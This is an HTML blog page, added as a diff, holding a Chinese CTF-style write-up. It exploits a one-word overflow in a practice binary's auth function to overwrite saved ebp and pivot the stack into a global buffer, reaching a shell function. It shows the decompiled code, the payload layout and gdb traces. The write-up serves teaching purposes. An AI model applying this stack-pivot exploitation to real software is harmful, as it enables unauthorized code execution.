@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Nono</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-siteapp"/>
+    <link rel="stylesheet" href="/styles/main.css">
+    <link rel="stylesheet" href="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/css/mdui.min.css">
+    <link rel="stylesheet" href="/media/css/post.css">
+    <link rel="stylesheet" href="/media/live2d/css/live2d.css" />
+    
+</head>
+<body class=" mdui-appbar-with-toolbar  mdui-theme-primary-pink mdui-theme-accent-pink">
+<header class="mdui-toolbar mdui-color-pink mdui-appbar-fixed mdui-appbar-scroll-toolbar-hide" style="z-index: 1000">
+    <a href="javascript:;" mdui-drawer="{target: '#left-drawer',overlay:true}" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+    <span class="mdui-typo-title">Nono</span>
+    <div class="mdui-toolbar-spacer"></div>
+<!--    <a href="javascript:history.go(0);" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">more_vert</i></a>
+</header>
+
+<div class="mdui-drawer mdui-color-white mdui-drawer-full-height mdui-drawer-close" id="left-drawer">
+    <ul class="mdui-list">
+        <li class="mdui-subheader">菜单</li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/" class="mdui-list-item-content">首页</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/archives" class="mdui-list-item-content">归档</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/tags" class="mdui-list-item-content">标签</a>
+        </li>
+        
+        <li class="mdui-list-item mdui-ripple">
+            <a href="/post/about" class="mdui-list-item-content">关于</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div id="content" class="site-content">
+    <div id="primary" class="content-area">
+        <main id="main" class="site-main" role="main">
+            <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
+                <header class="entry-header">
+                    <h1 class="entry-title">通过修改ebp改变程序的走向</h1>
+                    <p class="entry-census">发布于 2020-12-16</p>
+                    <hr>
+                </header>
+                <div class="neko">
+                    <p>查看保护</p>
+<pre><code>giantbranch@ubuntu:~/Desktop$ checksec format2
+[*] '/home/giantbranch/Desktop/format2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>用ida打开</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+18h] [ebp-28h]
+  char s; // [esp+1Eh] [ebp-22h]
+  unsigned int v6; // [esp+3Ch] [ebp-4h]
+
+  memset(&amp;s, 0, 0x1Eu);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  printf(&quot;Authenticate : &quot;);
+  _isoc99_scanf(&quot;%30s&quot;, &amp;s);
+  memset(&amp;input, 0, 0xCu);
+  v4 = 0;
+  v6 = Base64Decode((int)&amp;s, &amp;v4);
+  if ( v6 &gt; 0xC )
+  {
+    puts(&quot;Wrong Length&quot;);
+  }
+  else
+  {
+    memcpy(&amp;input, v4, v6);
+    if ( auth(v6) == 1 )
+      correct();
+  }
+  return 0;
+}
+</code></pre>
+<p>Base64Decode((int)&amp;s, &amp;v4)对输入的数进行了解密，同时把长度赋给v6，这里对v6进行了限制，输入的数据不能超过12个，进入auth（）函数中查看</p>
+<pre><code>_BOOL4 __cdecl auth(int a1)
+{
+  char v2; // [esp+14h] [ebp-14h]
+  char *s2; // [esp+1Ch] [ebp-Ch]
+  int v4; // [esp+20h] [ebp-8h]
+
+  memcpy(&amp;v4, &amp;input, a1);
+  s2 = (char *)calc_md5((int)&amp;v2, 12);
+  printf(&quot;hash : %s\n&quot;, s2);
+  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;
+}
+</code></pre>
+<p>发现v4最多8个字节，而输入最多12个，刚好可以覆盖ebp，在函数执行完后一般会执行</p>
+<pre><code>leave
+retn
+</code></pre>
+<p>这相当于</p>
+<pre><code>mov esp,ebp#将ebp的值赋给esp
+pop ebp#将栈中存储的上一个栈的ebp赋给ebp
+retn#call [rsp+4]
+</code></pre>
+<p>这时让input=‘aaaa'+p32(0x8049284)+p32(0x811eb40)</p>
+<pre><code>gdb-peda$ x/4gx 0x0811EB40
+0x811eb40 &lt;input&gt;:	0x0804928461616161	0x000000000811eb40
+0x811eb50 &lt;OPENSSL_ia32cap_P&gt;:	0xfffa32034f8bffff	0x0000000000000000
+</code></pre>
+<p>这时栈中的情况：</p>
+<pre><code>0032| 0xffb034a0 (&quot;aaaa\204\222\004\b@\353\021\b\a\224\004&quot;...)
+0036| 0xffb034a4 --&gt; 0x8049284 (&lt;correct+37&gt;:	mov    DWORD PTR [esp],0x80da66f)#ebp
+0040| 0xffb034a8 --&gt; 0x811eb40 (&quot;aaaa\204\222\004\b@\353\021\b&quot;)
+</code></pre>
+<p>可以发现ebp处的值覆盖为input的地址</p>
+<p>各寄存器的情况</p>
+<pre><code>EAX  0x0
+ EBX  0x80481d0 (_init) ◂— push   ebx
+ ECX  0x61
+ EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
+ EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
+ ESI  0x0
+ EBP  0xffb034a8 —▸ 0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ ESP  0xffb03480 —▸ 0x80da684 ◂— cmp    byte ptr [edi], dh
+ EIP  0x804930b (auth+111) ◂— leave  
+</code></pre>
+<p>再auth（）函数结束只会进行如下操作</p>
+<pre><code>mov esp,ebp#0xffb034a8存储再esp中
+pop ebp #将0x811eb40赋给ebp
+retn #call [esp+4],及call[0xffb034ac]
+</code></pre>
+<pre><code>EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ESP  0xffb034ac —▸ 0x8049407 (main+250) ◂— cmp    eax, 1
+</code></pre>
+<p>这时进入主函数中，这时个寄存器的状况</p>
+<pre><code>EAX  0x0
+ EBX  0x80481d0 (_init) ◂— push   ebx
+ ECX  0x61
+ EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
+ EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
+ ESI  0x0
+ EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ ESP  0xffb034b0 ◂— 0xc /* '\x0c' */
+ EIP  0x8049424 (main+279) ◂— leave  
+</code></pre>
+<p>这时进行</p>
+<pre><code>mov esp,ebp #esp=0x811eb40
+pop ebp #ebp=0x61616161
+retn #call[0x811eb40+4],而0x811eb44刚好存储着getshell的地址
+</code></pre>
+
+                </div>
+            </article>
+        </main>
+    </div>
+    <div class="doc-footer-nav mdui-color-theme">
+        <div class="mdui-container">
+            <div class="mdui-row">
+                
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
+                
+                
+                <a href="https://czh11.github.io/post/fastbin-attack/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
+                    <div class="doc-footer-nav-text">
+                        <i class="mdui-icon material-icons">arrow_forward</i>
+                        <span class="doc-footer-nav-direction">下一篇文章</span>
+                        <div class="doc-footer-nav-chapter">Fastbin Attack</div>
+                    </div>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+    <br>
+    
+    <div class="comment"></div>
+</div>
+<footer class="mdui-container footer ">
+    <div class="head_card-offset"></div>
+    <div class="mdui-row mdui-row-gapless">
+        <div class="k-container">
+            <img width="100%" src="/media/img/skirt.png">
+        </div>
+    </div>
+
+    <div class="site-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+</footer>
+<div id="landlord" style="left:5px;bottom:0px;">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
+    <div class="live_talk_input_body">
+        <div class="live_talk_input_name_body">
+            <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off" placeholder="你的名字" />
+        </div>
+        <div class="live_talk_input_text_body">
+            <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off" placeholder="要和我聊什么呀？"/>
+            <button type="button" class="live_talk_send_btn" id="talk_send">发送</button>
+        </div>
+    </div>
+    <input name="live_talk" id="live_talk" value="1" type="hidden" />
+    <div class="live_ico_box">
+        <div class="live_ico_item type_info" id="showInfoBtn"></div>
+        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
+        <div class="live_ico_item type_music" id="musicButton"></div>
+        <div class="live_ico_item type_youdu" id="youduButton"></div>
+        <div class="live_ico_item type_quit" id="hideButton"></div>
+        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
+        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
+        <input name="live2dBGM" value="https://img.apa70.com/123.mp3" type="hidden">
+        <input name="live2dBGM" value="https://img.apa70.com/123.mp3" type="hidden">
+        <input id="duType" value="douqilai,l2d_caihong" type="hidden">
+    </div>
+</div>
+<div id="open_live2d">召唤伊斯特瓦尔</div>
+<script>
+    var message_Path = '/media/live2d/';//资源目录，如果目录不对请更改
+    var talkAPI = "";//如果有类似图灵机器人的聊天接口请填写接口路径
+</script>
+<!--<script src="/media/js/jquery-3.3.1.min.js"></script>-->
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script type="text/javascript" src="/media/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/media/live2d/js/message.js"></script>
+
+</body>
+<script src="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/js/mdui.min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    $('.comment').bind('DOMNodeInserted',()=>{
+        $('.comment').unbind()
+
+        $('.vbtn').addClass(' mdui-btn mdui-color-theme-accent mdui-ripple')
+    })
+
+    let valine = new Valine({
+        el: '.comment',
+        
+        
+        
+        path: window.location.pathname,
+        pageSize: 30,
+        avatar:'mm',
+        notify:true
+    })
+</script>
+</html>
